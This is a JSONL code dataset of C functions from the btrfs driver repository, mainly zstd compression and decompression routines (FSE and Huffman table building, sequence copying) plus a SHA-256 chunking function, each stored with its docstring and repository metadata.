{"docstring": "/*! ZSTD_overlapCopy8() :\n *  Copies 8 bytes from ip to op and updates op and ip where ip <= op.\n *  If the offset is < 8 then the offset is spread to at least 8 bytes.\n *\n *  Precondition: *ip <= *op\n *  Postcondition: *op - *op >= 8\n */\n", "func_signal": "HINT_INLINE void ZSTD_overlapCopy8(BYTE** op, BYTE const** ip, size_t offset)", "code": "{\n    assert(*ip <= *op);\n    if (offset < 8) {\n        /* close range match, overlap */\n        static const U32 dec32table[] = { 0, 1, 2, 1, 4, 4, 4, 4 };   /* added */\n        static const int dec64table[] = { 8, 8, 8, 7, 8, 9,10,11 };   /* subtracted */\n        int const sub2 = dec64table[offset];\n        (*op)[0] = (*ip)[0];\n        (*op)[1] = (*ip)[1];\n        (*op)[2] = (*ip)[2];\n        (*op)[3] = (*ip)[3];\n        *ip += dec32table[offset];\n        ZSTD_copy4(*op+4, *ip);\n        *ip -= sub2;\n    } else {\n        ZSTD_copy8(*op, *ip);\n    }\n    *ip += 8;\n    *op += 8;\n    assert(*op - *ip >= 8);\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*! ZSTD_buildSeqTable() :\n * @return : nb bytes read from src,\n *           or an error code if it fails */\n", "func_signal": "static size_t ZSTD_buildSeqTable(ZSTD_seqSymbol* DTableSpace, const ZSTD_seqSymbol** DTablePtr,\n                                 symbolEncodingType_e type, unsigned max, U32 maxLog,\n                                 const void* src, size_t srcSize,\n                                 const U32* baseValue, const U32* nbAdditionalBits,\n                                 const ZSTD_seqSymbol* defaultTable, U32 flagRepeatTable,\n                                 int ddictIsCold, int nbSeq)", "code": "{\n    switch(type)\n    {\n    case set_rle :\n        RETURN_ERROR_IF(!srcSize, srcSize_wrong, \"\");\n        RETURN_ERROR_IF((*(const BYTE*)src) > max, corruption_detected, \"\");\n        {   U32 const symbol = *(const BYTE*)src;\n            U32 const baseline = baseValue[symbol];\n            U32 const nbBits = nbAdditionalBits[symbol];\n            ZSTD_buildSeqTable_rle(DTableSpace, baseline, nbBits);\n        }\n        *DTablePtr = DTableSpace;\n        return 1;\n    case set_basic :\n        *DTablePtr = defaultTable;\n        return 0;\n    case set_repeat:\n        RETURN_ERROR_IF(!flagRepeatTable, corruption_detected, \"\");\n        /* prefetch FSE table if used */\n        if (ddictIsCold && (nbSeq > 24 /* heuristic */)) {\n            const void* const pStart = *DTablePtr;\n            size_t const pSize = sizeof(ZSTD_seqSymbol) * (SEQSYMBOL_TABLE_SIZE(maxLog));\n            PREFETCH_AREA(pStart, pSize);\n        }\n        return 0;\n    case set_compressed :\n        {   unsigned tableLog;\n            S16 norm[MaxSeq+1];\n            size_t const headerSize = FSE_readNCount(norm, &max, &tableLog, src, srcSize);\n            RETURN_ERROR_IF(FSE_isError(headerSize), corruption_detected, \"\");\n            RETURN_ERROR_IF(tableLog > maxLog, corruption_detected, \"\");\n            ZSTD_buildFSETable(DTableSpace, norm, max, baseValue, nbAdditionalBits, tableLog);\n            *DTablePtr = DTableSpace;\n            return headerSize;\n        }\n    default :\n        assert(0);\n        RETURN_ERROR(GENERIC, \"impossible\");\n    }\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*_*******************************************************\n*  Memory operations\n**********************************************************/\n", "func_signal": "static void ZSTD_copy4(void* dst, const void* src)", "code": "{ memcpy(dst, src, 4); }\n\n\n/*-*************************************************************\n *   Block decoding\n ***************************************************************/\n\n/*! ZSTD_getcBlockSize() :\n *  Provides the size of compressed block from block header `src` */\nsize_t ZSTD_getcBlockSize(const void* src, size_t srcSize,\n                          blockProperties_t* bpPtr)\n{\n    RETURN_ERROR_IF(srcSize < ZSTD_blockHeaderSize, srcSize_wrong, \"\");\n\n    {   U32 const cBlockHeader = MEM_readLE24(src);\n        U32 const cSize = cBlockHeader >> 3;\n        bpPtr->lastBlock = cBlockHeader & 1;\n        bpPtr->blockType = (blockType_e)((cBlockHeader >> 1) & 3);\n        bpPtr->origSize = cSize;   /* only useful for RLE */\n        if (bpPtr->blockType == bt_rle) return 1;\n        RETURN_ERROR_IF(bpPtr->blockType == bt_reserved, corruption_detected, \"\");\n        return cSize;\n    }\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* Return value: bool */\n", "func_signal": "static int calc_chunk(uint8_t chunk[CHUNK_SIZE], struct buffer_state * state)", "code": "{\n\tsize_t space_in_chunk;\n\n\tif (state->total_len_delivered) {\n\t\treturn 0;\n\t}\n\n\tif (state->len >= CHUNK_SIZE) {\n\t\tmemcpy(chunk, state->p, CHUNK_SIZE);\n\t\tstate->p += CHUNK_SIZE;\n\t\tstate->len -= CHUNK_SIZE;\n\t\treturn 1;\n\t}\n\n\tmemcpy(chunk, state->p, state->len);\n\tchunk += state->len;\n\tspace_in_chunk = CHUNK_SIZE - state->len;\n\tstate->p += state->len;\n\tstate->len = 0;\n\n\t/* If we are here, space_in_chunk is one at minimum. */\n\tif (!state->single_one_delivered) {\n\t\t*chunk++ = 0x80;\n\t\tspace_in_chunk -= 1;\n\t\tstate->single_one_delivered = 1;\n\t}\n\n\t/*\n\t * Now:\n\t * - either there is enough space left for the total length, and we can conclude,\n\t * - or there is too little space left, and we have to pad the rest of this chunk with zeroes.\n\t * In the latter case, we will conclude at the next invokation of this function.\n\t */\n\tif (space_in_chunk >= TOTAL_LEN_LEN) {\n\t\tconst size_t left = space_in_chunk - TOTAL_LEN_LEN;\n\t\tsize_t len = state->total_len;\n\t\tint i;\n\t\tmemset(chunk, 0x00, left);\n\t\tchunk += left;\n\n\t\t/* Storing of len * 8 as a big endian 64-bit without overflow. */\n\t\tchunk[7] = (uint8_t) (len << 3);\n\t\tlen >>= 5;\n\t\tfor (i = 6; i >= 0; i--) {\n\t\t\tchunk[i] = (uint8_t) len;\n\t\t\tlen >>= 8;\n\t\t}\n\t\tstate->total_len_delivered = 1;\n\t} else {\n\t\tmemset(chunk, 0x00, space_in_chunk);\n\t}\n\n\treturn 1;\n}", "path": "btrfs/src/sha256.c", "commit_date": "2020-02-21 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* fake FSE_CTable, for raw (uncompressed) input */\n", "func_signal": "size_t FSE_buildCTable_raw (FSE_CTable* ct, unsigned nbBits)", "code": "{\n    const unsigned tableSize = 1 << nbBits;\n    const unsigned tableMask = tableSize - 1;\n    const unsigned maxSymbolValue = tableMask;\n    void* const ptr = ct;\n    U16* const tableU16 = ( (U16*) ptr) + 2;\n    void* const FSCT = ((U32*)ptr) + 1 /* header */ + (tableSize>>1);   /* assumption : tableLog >= 1 */\n    FSE_symbolCompressionTransform* const symbolTT = (FSE_symbolCompressionTransform*) (FSCT);\n    unsigned s;\n\n    /* Sanity checks */\n    if (nbBits < 1) return ERROR(GENERIC);             /* min size */\n\n    /* header */\n    tableU16[-2] = (U16) nbBits;\n    tableU16[-1] = (U16) maxSymbolValue;\n\n    /* Build table */\n    for (s=0; s<tableSize; s++)\n        tableU16[s] = (U16)(tableSize + s);\n\n    /* Build Symbol Transformation Table */\n    {   const U32 deltaNbBits = (nbBits << 16) - (1 << nbBits);\n        for (s=0; s<=maxSymbolValue; s++) {\n            symbolTT[s].deltaNbBits = deltaNbBits;\n            symbolTT[s].deltaFindState = s-1;\n    }   }\n\n    return 0;\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*-**************************************************************\n*  FSE Compression Code\n****************************************************************/\n", "func_signal": "FSE_CTable* FSE_createCTable (unsigned maxSymbolValue, unsigned tableLog)", "code": "{\n    size_t size;\n    if (tableLog > FSE_TABLELOG_ABSOLUTE_MAX) tableLog = FSE_TABLELOG_ABSOLUTE_MAX;\n    size = FSE_CTABLE_SIZE_U32 (tableLog, maxSymbolValue) * sizeof(U32);\n    return (FSE_CTable*)ExAllocatePoolWithTag(PagedPool, size, FSEC_ALLOC_TAG);\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* ZSTD_buildFSETable() :\n * generate FSE decoding table for one symbol (ll, ml or off)\n * cannot fail if input is valid =>\n * all inputs are presumed validated at this stage */\n", "func_signal": "void\nZSTD_buildFSETable(ZSTD_seqSymbol* dt,\n            const short* normalizedCounter, unsigned maxSymbolValue,\n            const U32* baseValue, const U32* nbAdditionalBits,\n            unsigned tableLog)", "code": "{\n    ZSTD_seqSymbol* const tableDecode = dt+1;\n    U16 symbolNext[MaxSeq+1];\n\n    U32 const maxSV1 = maxSymbolValue + 1;\n    U32 const tableSize = 1 << tableLog;\n    U32 highThreshold = tableSize-1;\n\n    /* Sanity Checks */\n    assert(maxSymbolValue <= MaxSeq);\n    assert(tableLog <= MaxFSELog);\n\n    /* Init, lay down lowprob symbols */\n    {   ZSTD_seqSymbol_header DTableH;\n        DTableH.tableLog = tableLog;\n        DTableH.fastMode = 1;\n        {   S16 const largeLimit= (S16)(1 << (tableLog-1));\n            U32 s;\n            for (s=0; s<maxSV1; s++) {\n                if (normalizedCounter[s]==-1) {\n                    tableDecode[highThreshold--].baseValue = s;\n                    symbolNext[s] = 1;\n                } else {\n                    if (normalizedCounter[s] >= largeLimit) DTableH.fastMode=0;\n                    assert(normalizedCounter[s]>=0);\n                    symbolNext[s] = (U16)normalizedCounter[s];\n        }   }   }\n        memcpy(dt, &DTableH, sizeof(DTableH));\n    }\n\n    /* Spread symbols */\n    {   U32 const tableMask = tableSize-1;\n        U32 const step = FSE_TABLESTEP(tableSize);\n        U32 s, position = 0;\n        for (s=0; s<maxSV1; s++) {\n            int i;\n            for (i=0; i<normalizedCounter[s]; i++) {\n                tableDecode[position].baseValue = s;\n                position = (position + step) & tableMask;\n                while (position > highThreshold) position = (position + step) & tableMask;   /* lowprob area */\n        }   }\n        assert(position == 0); /* position must reach all cells once, otherwise normalizedCounter is incorrect */\n    }\n\n    /* Build Decoding table */\n    {   U32 u;\n        for (u=0; u<tableSize; u++) {\n            U32 const symbol = tableDecode[u].baseValue;\n            U32 const nextState = symbolNext[symbol]++;\n            tableDecode[u].nbBits = (BYTE) (tableLog - BIT_highbit32(nextState) );\n            tableDecode[u].nextState = (U16) ( (nextState << tableDecode[u].nbBits) - tableSize);\n            assert(nbAdditionalBits[symbol] < 255);\n            tableDecode[u].nbAdditionalBits = (BYTE)nbAdditionalBits[symbol];\n            tableDecode[u].baseValue = baseValue[symbol];\n    }   }\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* FSE_buildCTable_wksp() :\n * Same as FSE_buildCTable(), but using an externally allocated scratch buffer (`workSpace`).\n * wkspSize should be sized to handle worst case situation, which is `1<<max_tableLog * sizeof(FSE_FUNCTION_TYPE)`\n * workSpace must also be properly aligned with FSE_FUNCTION_TYPE requirements\n */\n", "func_signal": "size_t FSE_buildCTable_wksp(FSE_CTable* ct,\n                      const short* normalizedCounter, unsigned maxSymbolValue, unsigned tableLog,\n                            void* workSpace, size_t wkspSize)", "code": "{\n    U32 const tableSize = 1 << tableLog;\n    U32 const tableMask = tableSize - 1;\n    void* const ptr = ct;\n    U16* const tableU16 = ( (U16*) ptr) + 2;\n    void* const FSCT = ((U32*)ptr) + 1 /* header */ + (tableLog ? tableSize>>1 : 1) ;\n    FSE_symbolCompressionTransform* const symbolTT = (FSE_symbolCompressionTransform*) (FSCT);\n    U32 const step = FSE_TABLESTEP(tableSize);\n    U32 cumul[FSE_MAX_SYMBOL_VALUE+2];\n\n    FSE_FUNCTION_TYPE* const tableSymbol = (FSE_FUNCTION_TYPE*)workSpace;\n    U32 highThreshold = tableSize-1;\n\n    /* CTable header */\n    if (((size_t)1 << tableLog) * sizeof(FSE_FUNCTION_TYPE) > wkspSize) return ERROR(tableLog_tooLarge);\n    tableU16[-2] = (U16) tableLog;\n    tableU16[-1] = (U16) maxSymbolValue;\n    assert(tableLog < 16);   /* required for threshold strategy to work */\n\n    /* For explanations on how to distribute symbol values over the table :\n     * http://fastcompression.blogspot.fr/2014/02/fse-distributing-symbol-values.html */\n\n     #ifdef __clang_analyzer__\n     memset(tableSymbol, 0, sizeof(*tableSymbol) * tableSize);   /* useless initialization, just to keep scan-build happy */\n     #endif\n\n    /* symbol start positions */\n    {   U32 u;\n        cumul[0] = 0;\n        for (u=1; u <= maxSymbolValue+1; u++) {\n            if (normalizedCounter[u-1]==-1) {  /* Low proba symbol */\n                cumul[u] = cumul[u-1] + 1;\n                tableSymbol[highThreshold--] = (FSE_FUNCTION_TYPE)(u-1);\n            } else {\n                cumul[u] = cumul[u-1] + normalizedCounter[u-1];\n        }   }\n        cumul[maxSymbolValue+1] = tableSize+1;\n    }\n\n    /* Spread symbols */\n    {   U32 position = 0;\n        U32 symbol;\n        for (symbol=0; symbol<=maxSymbolValue; symbol++) {\n            int nbOccurrences;\n            int const freq = normalizedCounter[symbol];\n            for (nbOccurrences=0; nbOccurrences<freq; nbOccurrences++) {\n                tableSymbol[position] = (FSE_FUNCTION_TYPE)symbol;\n                position = (position + step) & tableMask;\n                while (position > highThreshold)\n                    position = (position + step) & tableMask;   /* Low proba area */\n        }   }\n\n        assert(position==0);  /* Must have initialized all positions */\n    }\n\n    /* Build table */\n    {   U32 u; for (u=0; u<tableSize; u++) {\n        FSE_FUNCTION_TYPE s = tableSymbol[u];   /* note : static analyzer may not understand tableSymbol is properly initialized */\n        tableU16[cumul[s]++] = (U16) (tableSize+u);   /* TableU16 : sorted by symbol order; gives next state value */\n    }   }\n\n    /* Build Symbol Transformation Table */\n    {   unsigned total = 0;\n        unsigned s;\n        for (s=0; s<=maxSymbolValue; s++) {\n            switch (normalizedCounter[s])\n            {\n            case  0:\n                /* filling nonetheless, for compatibility with FSE_getMaxNbBits() */\n                symbolTT[s].deltaNbBits = ((tableLog+1) << 16) - (1<<tableLog);\n                break;\n\n            case -1:\n            case  1:\n                symbolTT[s].deltaNbBits = (tableLog << 16) - (1<<tableLog);\n                symbolTT[s].deltaFindState = total - 1;\n                total ++;\n                break;\n            default :\n                {\n                    U32 const maxBitsOut = tableLog - BIT_highbit32 (normalizedCounter[s]-1);\n                    U32 const minStatePlus = normalizedCounter[s] << maxBitsOut;\n                    symbolTT[s].deltaNbBits = (maxBitsOut << 16) - minStatePlus;\n                    symbolTT[s].deltaFindState = total - normalizedCounter[s];\n                    total +=  normalizedCounter[s];\n    }   }   }   }\n\n#if 0  /* debug : symbol costs */\n    DEBUGLOG(5, \"\\n --- table statistics : \");\n    {   U32 symbol;\n        for (symbol=0; symbol<=maxSymbolValue; symbol++) {\n            DEBUGLOG(5, \"%3u: w=%3i,   maxBits=%u, fracBits=%.2f\",\n                symbol, normalizedCounter[symbol],\n                FSE_getMaxNbBits(symbolTT, symbol),\n                (double)FSE_bitCost(symbolTT, tableLog, symbol, 8) / 256);\n        }\n    }\n#endif\n\n    return 0;\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/** ZSTD_buildSuperBlockEntropy_sequences() :\n *  Builds entropy for the super-block sequences.\n *  Stores symbol compression modes and fse table to fseMetadata.\n *  @return : size of fse tables or error code */\n", "func_signal": "static size_t ZSTD_buildSuperBlockEntropy_sequences(seqStore_t* seqStorePtr,\n                                              const ZSTD_fseCTables_t* prevEntropy,\n                                                    ZSTD_fseCTables_t* nextEntropy,\n                                              const ZSTD_CCtx_params* cctxParams,\n                                                    ZSTD_fseCTablesMetadata_t* fseMetadata,\n                                                    void* workspace, size_t wkspSize)", "code": "{\n    BYTE* const wkspStart = (BYTE*)workspace;\n    BYTE* const wkspEnd = wkspStart + wkspSize;\n    BYTE* const countWkspStart = wkspStart;\n    unsigned* const countWksp = (unsigned*)workspace;\n    const size_t countWkspSize = (MaxSeq + 1) * sizeof(unsigned);\n    BYTE* const cTableWksp = countWkspStart + countWkspSize;\n    const size_t cTableWkspSize = wkspEnd-cTableWksp;\n    ZSTD_strategy const strategy = cctxParams->cParams.strategy;\n    FSE_CTable* CTable_LitLength = nextEntropy->litlengthCTable;\n    FSE_CTable* CTable_OffsetBits = nextEntropy->offcodeCTable;\n    FSE_CTable* CTable_MatchLength = nextEntropy->matchlengthCTable;\n    const BYTE* const ofCodeTable = seqStorePtr->ofCode;\n    const BYTE* const llCodeTable = seqStorePtr->llCode;\n    const BYTE* const mlCodeTable = seqStorePtr->mlCode;\n    size_t const nbSeq = seqStorePtr->sequences - seqStorePtr->sequencesStart;\n    BYTE* const ostart = fseMetadata->fseTablesBuffer;\n    BYTE* const oend = ostart + sizeof(fseMetadata->fseTablesBuffer);\n    BYTE* op = ostart;\n\n    assert(cTableWkspSize >= (1 << MaxFSELog) * sizeof(FSE_FUNCTION_TYPE));\n    DEBUGLOG(5, \"ZSTD_buildSuperBlockEntropy_sequences (nbSeq=%zu)\", nbSeq);\n    memset(workspace, 0, wkspSize);\n\n    fseMetadata->lastCountSize = 0;\n    /* convert length/distances into codes */\n    ZSTD_seqToCodes(seqStorePtr);\n    /* build CTable for Literal Lengths */\n    {   U32 LLtype;\n        unsigned max = MaxLL;\n        size_t const mostFrequent = HIST_countFast_wksp(countWksp, &max, llCodeTable, nbSeq, workspace, wkspSize);  /* can't fail */\n        DEBUGLOG(5, \"Building LL table\");\n        nextEntropy->litlength_repeatMode = prevEntropy->litlength_repeatMode;\n        LLtype = ZSTD_selectEncodingType(&nextEntropy->litlength_repeatMode,\n                                        countWksp, max, mostFrequent, nbSeq,\n                                        LLFSELog, prevEntropy->litlengthCTable,\n                                        LL_defaultNorm, LL_defaultNormLog,\n                                        ZSTD_defaultAllowed, strategy);\n        assert(set_basic < set_compressed && set_rle < set_compressed);\n        assert(!(LLtype < set_compressed && nextEntropy->litlength_repeatMode != FSE_repeat_none)); /* We don't copy tables */\n        {   size_t const countSize = ZSTD_buildCTable(op, oend - op, CTable_LitLength, LLFSELog, (symbolEncodingType_e)LLtype,\n                                                    countWksp, max, llCodeTable, nbSeq, LL_defaultNorm, LL_defaultNormLog, MaxLL,\n                                                    prevEntropy->litlengthCTable, sizeof(prevEntropy->litlengthCTable),\n                                                    cTableWksp, cTableWkspSize);\n            FORWARD_IF_ERROR(countSize, \"ZSTD_buildCTable for LitLens failed\");\n            if (LLtype == set_compressed)\n                fseMetadata->lastCountSize = countSize;\n            op += countSize;\n            fseMetadata->llType = (symbolEncodingType_e) LLtype;\n    }   }\n    /* build CTable for Offsets */\n    {   U32 Offtype;\n        unsigned max = MaxOff;\n        size_t const mostFrequent = HIST_countFast_wksp(countWksp, &max, ofCodeTable, nbSeq, workspace, wkspSize);  /* can't fail */\n        /* We can only use the basic table if max <= DefaultMaxOff, otherwise the offsets are too large */\n        ZSTD_defaultPolicy_e const defaultPolicy = (max <= DefaultMaxOff) ? ZSTD_defaultAllowed : ZSTD_defaultDisallowed;\n        DEBUGLOG(5, \"Building OF table\");\n        nextEntropy->offcode_repeatMode = prevEntropy->offcode_repeatMode;\n        Offtype = ZSTD_selectEncodingType(&nextEntropy->offcode_repeatMode,\n                                        countWksp, max, mostFrequent, nbSeq,\n                                        OffFSELog, prevEntropy->offcodeCTable,\n                                        OF_defaultNorm, OF_defaultNormLog,\n                                        defaultPolicy, strategy);\n        assert(!(Offtype < set_compressed && nextEntropy->offcode_repeatMode != FSE_repeat_none)); /* We don't copy tables */\n        {   size_t const countSize = ZSTD_buildCTable(op, oend - op, CTable_OffsetBits, OffFSELog, (symbolEncodingType_e)Offtype,\n                                                    countWksp, max, ofCodeTable, nbSeq, OF_defaultNorm, OF_defaultNormLog, DefaultMaxOff,\n                                                    prevEntropy->offcodeCTable, sizeof(prevEntropy->offcodeCTable),\n                                                    cTableWksp, cTableWkspSize);\n            FORWARD_IF_ERROR(countSize, \"ZSTD_buildCTable for Offsets failed\");\n            if (Offtype == set_compressed)\n                fseMetadata->lastCountSize = countSize;\n            op += countSize;\n            fseMetadata->ofType = (symbolEncodingType_e) Offtype;\n    }   }\n    /* build CTable for MatchLengths */\n    {   U32 MLtype;\n        unsigned max = MaxML;\n        size_t const mostFrequent = HIST_countFast_wksp(countWksp, &max, mlCodeTable, nbSeq, workspace, wkspSize);   /* can't fail */\n        DEBUGLOG(5, \"Building ML table (remaining space : %i)\", (int)(oend-op));\n        nextEntropy->matchlength_repeatMode = prevEntropy->matchlength_repeatMode;\n        MLtype = ZSTD_selectEncodingType(&nextEntropy->matchlength_repeatMode,\n                                        countWksp, max, mostFrequent, nbSeq,\n                                        MLFSELog, prevEntropy->matchlengthCTable,\n                                        ML_defaultNorm, ML_defaultNormLog,\n                                        ZSTD_defaultAllowed, strategy);\n        assert(!(MLtype < set_compressed && nextEntropy->matchlength_repeatMode != FSE_repeat_none)); /* We don't copy tables */\n        {   size_t const countSize = ZSTD_buildCTable(op, oend - op, CTable_MatchLength, MLFSELog, (symbolEncodingType_e)MLtype,\n                                                    countWksp, max, mlCodeTable, nbSeq, ML_defaultNorm, ML_defaultNormLog, MaxML,\n                                                    prevEntropy->matchlengthCTable, sizeof(prevEntropy->matchlengthCTable),\n                                                    cTableWksp, cTableWkspSize);\n            FORWARD_IF_ERROR(countSize, \"ZSTD_buildCTable for MatchLengths failed\");\n            if (MLtype == set_compressed)\n                fseMetadata->lastCountSize = countSize;\n            op += countSize;\n            fseMetadata->mlType = (symbolEncodingType_e) MLtype;\n    }   }\n    assert((size_t) (op-ostart) <= sizeof(fseMetadata->fseTablesBuffer));\n    return op-ostart;\n}", "path": "btrfs/src/zstd/zstd_compress_superblock.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*! ZSTD_safecopy() :\n *  Specialized version of memcpy() that is allowed to READ up to WILDCOPY_OVERLENGTH past the input buffer\n *  and write up to 16 bytes past oend_w (op >= oend_w is allowed).\n *  This function is only called in the uncommon case where the sequence is near the end of the block. It\n *  should be fast for a single long sequence, but can be slow for several short sequences.\n *\n *  @param ovtype controls the overlap detection\n *         - ZSTD_no_overlap: The source and destination are guaranteed to be at least WILDCOPY_VECLEN bytes apart.\n *         - ZSTD_overlap_src_before_dst: The src and dst may overlap and may be any distance apart.\n *           The src buffer must be before the dst buffer.\n */\n", "func_signal": "static void ZSTD_safecopy(BYTE* op, BYTE* const oend_w, BYTE const* ip, ptrdiff_t length, ZSTD_overlap_e ovtype)", "code": "{\n    ptrdiff_t const diff = op - ip;\n    BYTE* const oend = op + length;\n\n    assert((ovtype == ZSTD_no_overlap && (diff <= -8 || diff >= 8 || op >= oend_w)) ||\n           (ovtype == ZSTD_overlap_src_before_dst && diff >= 0));\n\n    if (length < 8) {\n        /* Handle short lengths. */\n        while (op < oend) *op++ = *ip++;\n        return;\n    }\n    if (ovtype == ZSTD_overlap_src_before_dst) {\n        /* Copy 8 bytes and ensure the offset >= 8 when there can be overlap. */\n        assert(length >= 8);\n        ZSTD_overlapCopy8(&op, &ip, diff);\n        assert(op - ip >= 8);\n        assert(op <= oend);\n    }\n\n    if (oend <= oend_w) {\n        /* No risk of overwrite. */\n        ZSTD_wildcopy(op, ip, length, ovtype);\n        return;\n    }\n    if (op <= oend_w) {\n        /* Wildcopy until we get close to the end. */\n        assert(oend > oend_w);\n        ZSTD_wildcopy(op, ip, oend_w - op, ovtype);\n        ip += oend_w - op;\n        op = oend_w;\n    }\n    /* Handle the leftovers. */\n    while (op < oend) *op++ = *ip++;\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/** HUF_selectDecoder() :\n *  Tells which decoder is likely to decode faster,\n *  based on a set of pre-computed metrics.\n * @return : 0==HUF_decompress4X1, 1==HUF_decompress4X2 .\n *  Assumption : 0 < dstSize <= 128 KB */\n", "func_signal": "U32 HUF_selectDecoder (size_t dstSize, size_t cSrcSize)", "code": "{\n    assert(dstSize > 0);\n    assert(dstSize <= 128*1024);\n#if defined(HUF_FORCE_DECOMPRESS_X1)\n    (void)dstSize;\n    (void)cSrcSize;\n    return 0;\n#elif defined(HUF_FORCE_DECOMPRESS_X2)\n    (void)dstSize;\n    (void)cSrcSize;\n    return 1;\n#else\n    /* decoder timing evaluation */\n    {   U32 const Q = (cSrcSize >= dstSize) ? 15 : (U32)(cSrcSize * 16 / dstSize);   /* Q < 16 */\n        U32 const D256 = (U32)(dstSize >> 8);\n        U32 const DTime0 = algoTime[Q][0].tableTime + (algoTime[Q][0].decode256Time * D256);\n        U32 DTime1 = algoTime[Q][1].tableTime + (algoTime[Q][1].decode256Time * D256);\n        DTime1 += DTime1 >> 3;  /* advantage to algorithm using less memory, to reduce cache eviction */\n        return DTime1 < DTime0;\n    }\n#endif\n}", "path": "btrfs/src/zstd/huf_decompress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*-**************************************************************\n*  FSE NCount encoding\n****************************************************************/\n", "func_signal": "size_t FSE_NCountWriteBound(unsigned maxSymbolValue, unsigned tableLog)", "code": "{\n    size_t const maxHeaderSize = (((maxSymbolValue+1) * tableLog) >> 3) + 3;\n    return maxSymbolValue ? maxHeaderSize : FSE_NCOUNTBOUND;  /* maxSymbolValue==0 ? use default */\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* fake FSE_CTable, for rle input (always same symbol) */\n", "func_signal": "size_t FSE_buildCTable_rle (FSE_CTable* ct, BYTE symbolValue)", "code": "{\n    void* ptr = ct;\n    U16* tableU16 = ( (U16*) ptr) + 2;\n    void* FSCTptr = (U32*)ptr + 2;\n    FSE_symbolCompressionTransform* symbolTT = (FSE_symbolCompressionTransform*) FSCTptr;\n\n    /* header */\n    tableU16[-2] = (U16) 0;\n    tableU16[-1] = (U16) symbolValue;\n\n    /* Build table */\n    tableU16[0] = 0;\n    tableU16[1] = 0;   /* just in case */\n\n    /* Build Symbol Transformation Table */\n    symbolTT[symbolValue].deltaNbBits = 0;\n    symbolTT[symbolValue].deltaFindState = 0;\n\n    return 0;\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/** ZSTD_buildSuperBlockEntropy_literal() :\n *  Builds entropy for the super-block literals.\n *  Stores literals block type (raw, rle, compressed, repeat) and\n *  huffman description table to hufMetadata.\n *  @return : size of huffman description table or error code */\n", "func_signal": "static size_t ZSTD_buildSuperBlockEntropy_literal(void* const src, size_t srcSize,\n                                            const ZSTD_hufCTables_t* prevHuf,\n                                                  ZSTD_hufCTables_t* nextHuf,\n                                                  ZSTD_hufCTablesMetadata_t* hufMetadata,\n                                                  const int disableLiteralsCompression,\n                                                  void* workspace, size_t wkspSize)", "code": "{\n    BYTE* const wkspStart = (BYTE*)workspace;\n    BYTE* const wkspEnd = wkspStart + wkspSize;\n    BYTE* const countWkspStart = wkspStart;\n    unsigned* const countWksp = (unsigned*)workspace;\n    const size_t countWkspSize = (HUF_SYMBOLVALUE_MAX + 1) * sizeof(unsigned);\n    BYTE* const nodeWksp = countWkspStart + countWkspSize;\n    const size_t nodeWkspSize = wkspEnd-nodeWksp;\n    unsigned maxSymbolValue = 255;\n    unsigned huffLog = HUF_TABLELOG_DEFAULT;\n    HUF_repeat repeat = prevHuf->repeatMode;\n\n    DEBUGLOG(5, \"ZSTD_buildSuperBlockEntropy_literal (srcSize=%zu)\", srcSize);\n\n    /* Prepare nextEntropy assuming reusing the existing table */\n    memcpy(nextHuf, prevHuf, sizeof(*prevHuf));\n\n    if (disableLiteralsCompression) {\n        DEBUGLOG(5, \"set_basic - disabled\");\n        hufMetadata->hType = set_basic;\n        return 0;\n    }\n\n    /* small ? don't even attempt compression (speed opt) */\n#   define COMPRESS_LITERALS_SIZE_MIN 63\n    {   size_t const minLitSize = (prevHuf->repeatMode == HUF_repeat_valid) ? 6 : COMPRESS_LITERALS_SIZE_MIN;\n        if (srcSize <= minLitSize) {\n            DEBUGLOG(5, \"set_basic - too small\");\n            hufMetadata->hType = set_basic;\n            return 0;\n        }\n    }\n\n    /* Scan input and build symbol stats */\n    {   size_t const largest = HIST_count_wksp (countWksp, &maxSymbolValue, (const BYTE*)src, srcSize, workspace, wkspSize);\n        FORWARD_IF_ERROR(largest, \"HIST_count_wksp failed\");\n        if (largest == srcSize) {\n            DEBUGLOG(5, \"set_rle\");\n            hufMetadata->hType = set_rle;\n            return 0;\n        }\n        if (largest <= (srcSize >> 7)+4) {\n            